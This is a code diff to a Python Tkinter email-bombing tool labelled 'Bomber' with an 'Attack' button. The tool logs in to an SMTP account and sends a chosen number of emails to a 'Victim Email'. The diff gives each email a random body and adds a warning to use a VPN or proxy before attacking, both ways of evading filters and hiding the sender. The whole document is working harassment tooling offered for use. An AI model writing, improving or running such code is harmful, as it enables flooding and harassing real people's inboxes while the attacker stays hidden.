@@ -5,7 +5,7 @@ from tkinter import messagebox
 def main():
     root = Tk()
     root.resizable(FALSE, FALSE)
-    root.geometry('250x370')
+    root.geometry('250x330')
     root.title('Bomber')
     root.configure(background='black')
     #messagebox.showinfo("Credits", ''.join('All Rights Reserved To Bropocalypse Team'))
@@ -16,7 +16,7 @@ def main():
 
     form1 = LabelFrame(root, text="Attack", font='Helvetica 9 italic', background='black', foreground='cyan')
     form1.grid(row=2, columnspan=2, sticky='WE', \
-    padx=5, pady=0, ipadx=120, ipady=95)
+    padx=5, pady=0, ipadx=120, ipady=75)
 
     ############ Login
     l = Label(form, text='Your Email', background='black', foreground='white')
@@ -25,7 +25,7 @@ def main():
     l1 = Label(form, text='Your Password', background='black', foreground='white')
     l1.place(x=5, y=40)
 
-    global e0, e1, e2, e3, e4, e5, e6
+    global e0, e1, e2, e4, e5, e6
     e0 = Entry(form, width=20)
     e0.place(x=90, y=10)
 
@@ -39,34 +39,28 @@ def main():
     l2 = Label(form1, text='Victim Email', background='black', foreground='white')
     l2.place(x=5, y=10)
 
-    l3 = Label(form1, text='Message', background='black', foreground='white')
-    l3.place(x=15, y=50)
-
     l4 = Label(form1, text='Amount of\ntimes to send', background='black', foreground='white')
-    l4.place(x=5, y=80)
+    l4.place(x=5, y=50)
 
     e2 = Entry(form1, width=20)
     e2.place(x=90, y=10)
 
-    e3 = Entry(form1, width=20)
-    e3.place(x=90, y=50)
-
     e4 = Entry(form1, width=20)
-    e4.place(x=90, y=90)
+    e4.place(x=90, y=50)
 
-    
-
-    b1 = Button(form1, text='Attack', background='black', foreground='white', command= lambda:attack(lab, var))
-    b1.place(x=90, y=130)
+    b1 = Button(form1, text='Attack', background='black', foreground='white', command= lambda:[warn(), attack(lab, var)])
+    b1.place(x=90, y=90)
     
     var = IntVar()
     tok = "Email Sent : " + str(var.get())
     lab = Label(root, text=tok, background='black', foreground='white')
-    lab.place(x=85, y=330)
+    lab.place(x=85, y=290)
 
     mainloop()
 
-
+def warn():
+    messagebox.showwarning("Important", ''.join('Make Sure You Are Using VPN or PROXY'))
+    
 def login():
     try:
         global email
@@ -83,19 +77,19 @@ def login():
         messagebox.showinfo("", ''.join('Succesfully Login'))
     except smtplib.SMTPAuthenticationError:
         messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
-        messagebox.showerror("Error", ''.join('Check If The Options Of Less Secure Apps Is Enabled'))
+        messagebox.showerror("Error", ''.join('Make Sure The Options Of Less Secure Apps Is Enabled'))
 
-def generator(size=10, chars=string.ascii_uppercase + string.digits):
-    return ''.join(random.choice(chars) for _ in range(size))
+def generator():
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
 
 def attack(lab, var):
     try:
         vemail = e2.get()
-        message = generator()
         count = int(e4.get())
 
         lol = 0
         while lol < count:
+            message = generator()
             lol+=1
             server.sendmail(email,vemail,message)
             var.set(var.get()+1)
@@ -104,7 +98,7 @@ def attack(lab, var):
 
     except smtplib.SMTPAuthenticationError:
         messagebox.showerror("Error", ''.join('Incorrect Username Or Password'))
-        messagebox.showerror("Error", ''.join('Check If The Options Of Less Secure Apps Is Enabled'))
+        messagebox.showerror("Error", ''.join('Make Sure The Options Of Less Secure Apps Is Enabled'))
 
 
 main()
